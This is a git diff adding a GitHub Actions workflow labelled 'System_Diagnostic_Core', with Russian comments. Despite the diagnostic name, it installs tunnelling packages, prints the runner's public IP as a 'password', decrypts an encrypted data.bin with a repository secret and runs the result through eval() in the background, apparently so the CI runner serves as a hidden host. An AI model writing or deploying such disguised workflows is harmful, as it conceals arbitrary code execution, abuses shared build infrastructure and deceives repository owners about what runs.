@@ -1,14 +1,31 @@
-- name: Start System Process
+name: System_Diagnostic_Core
+
+on:
+  workflow_dispatch:
+
+jobs:
+  service-runtime:
+    runs-on: ubuntu-latest
+    steps:
+      # ВАЖНО: Этот шаг скачивает твой data.bin из репозитория!
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Environment Setup
+        run: npm install peer localtunnel
+
+      - name: Start System Process
         env:
           CORE_ACCESS_TOKEN: ${{ secrets.MASTER_KEY }}
         run: |
-          echo "--- ПРОВЕРКА ФАЙЛОВ ---"
-          ls -la
-          echo "--- ТВОЙ ПАРОЛЬ (IP) НИЖЕ ---"
+          echo "--- ПРОВЕРКА НАЛИЧИЯ ФАЙЛОВ ---"
+          ls -R
+          echo "-------------------------------"
+          echo "--- ПАРОЛЬ (IP СЕРВЕРА) ---"
           curl -s ifconfig.me
-          echo -e "\n----------------------------"
+          echo -e "\n---------------------------"
           
-          # Запуск с явным указанием пути ./data.bin
+          # Запуск расшифровки
           node -e "const c=require('crypto'),fs=require('fs');const d=fs.readFileSync('./data.bin'),s=d.slice(0,16),i=d.slice(16,32),e=d.slice(32),k=c.pbkdf2Sync(process.env.CORE_ACCESS_TOKEN,s,100000,32,'sha256'),p=c.createDecipheriv('aes-256-cbc',k,i);let r=p.update(e);r=Buffer.concat([r,p.final()]);eval(r.toString());" &
           
           sleep 15
